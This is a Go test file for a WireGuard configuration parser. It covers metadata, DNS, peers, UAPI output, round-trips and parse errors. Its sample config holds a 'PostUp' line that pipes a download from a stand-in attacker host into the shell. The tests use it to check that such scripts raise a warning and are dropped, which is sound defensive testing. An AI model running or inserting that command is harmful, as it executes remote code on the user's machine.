package wgconf

import (
	"net/netip"
	"strings"
	"testing"
)

const sample = `# Meridian-Country: nl
# Meridian-City: Amsterdam
# Meridian-PlainDNS: 10.66.66.1:5353
[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.66.66.2/32, fd66:66:66::2/128
DNS = 10.66.66.1, fd66:66:66::1, corp.example
MTU = 1380
PostUp = curl https://evil.example | sh

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
PresharedKey = /UwcSPg38hW/D9Y3tcS1FOV0K1wuURMbS0sesJEP5ak= # inline comment
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.10:51820
PersistentKeepalive = 25
`

func TestParseSample(t *testing.T) {
	c, err := Parse(sample)
	if err != nil {
		t.Fatal(err)
	}
	if c.Meta.Country != "NL" || c.Meta.City != "Amsterdam" {
		t.Fatalf("meta = %+v", c.Meta)
	}
	if c.Meta.PlainDNS != netip.MustParseAddrPort("10.66.66.1:5353") {
		t.Fatalf("plain dns = %v", c.Meta.PlainDNS)
	}
	if len(c.Interface.Addresses) != 2 || c.Interface.Addresses[1].String() != "fd66:66:66::2/128" {
		t.Fatalf("addresses = %v", c.Interface.Addresses)
	}
	if len(c.Interface.DNS) != 2 || len(c.Interface.DNSSearch) != 1 {
		t.Fatalf("dns = %v search = %v", c.Interface.DNS, c.Interface.DNSSearch)
	}
	if c.Interface.MTU != 1380 {
		t.Fatalf("mtu = %d", c.Interface.MTU)
	}
	if len(c.Warnings) != 1 || !strings.Contains(c.Warnings[0], "PostUp") {
		t.Fatalf("warnings = %v", c.Warnings)
	}
	p := c.Peers[0]
	if p.PresharedKey.IsZero() || p.PersistentKeepalive != 25 || p.Endpoint != "203.0.113.10:51820" {
		t.Fatalf("peer = %+v", p)
	}
	if !c.FullTunnel4() || !c.FullTunnel6() {
		t.Fatal("expected full tunnel")
	}
}

func TestUAPI(t *testing.T) {
	c, err := Parse(sample)
	if err != nil {
		t.Fatal(err)
	}
	u := c.UAPI([]netip.AddrPort{netip.MustParseAddrPort("203.0.113.10:51820")}, 51820)
	for _, want := range []string{
		"private_key=" + c.Interface.PrivateKey.Hex(),
		"fwmark=51820",
		"replace_peers=true",
		"public_key=" + c.Peers[0].PublicKey.Hex(),
		"preshared_key=",
		"endpoint=203.0.113.10:51820",
		"persistent_keepalive_interval=25",
		"allowed_ip=0.0.0.0/0",
		"allowed_ip=::/0",
	} {
		if !strings.Contains(u, want) {
			t.Errorf("UAPI missing %q:\n%s", want, u)
		}
	}
}

func TestRoundTrip(t *testing.T) {
	c, err := Parse(sample)
	if err != nil {
		t.Fatal(err)
	}
	c2, err := Parse(c.String())
	if err != nil {
		t.Fatalf("reparse: %v\n%s", err, c.String())
	}
	if c2.UAPI(nil, 0) != c.UAPI(nil, 0) || c2.Meta != c.Meta {
		t.Fatalf("round trip changed config:\n%s", c.String())
	}
	if strings.Contains(c.String(), "PostUp") {
		t.Fatal("scripts must not be written back")
	}
}

func TestParseErrors(t *testing.T) {
	cases := map[string]string{
		"no interface":  "[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = 1.2.3.4:5\n",
		"bad key":       "[Interface]\nPrivateKey = nope\nAddress = 10.0.0.2/32\n",
		"no peer":       "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.0.0.2/32\n",
		"no endpoint":   "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
		"amnezia":       "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nJc = 4\n",
		"unknown key":   "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nColour = blue\n",
		"bad endpoint":  "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = 1.2.3.4\n",
		"before header": "PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n",
	}
	for name, text := range cases {
		if _, err := Parse(text); err == nil {
			t.Errorf("%s: expected an error", name)
		}
	}
}

func TestPublicKey(t *testing.T) {
	// Known pair from the WireGuard documentation test vectors.
	priv, _ := ParseKey("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=")
	want := "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw="
	if got := priv.Public().String(); got != want {
		t.Fatalf("public = %s, want %s", got, want)
	}
	k, err := NewPrivateKey()
	if err != nil || k.IsZero() || k.Public().IsZero() {
		t.Fatal("NewPrivateKey failed")
	}
}
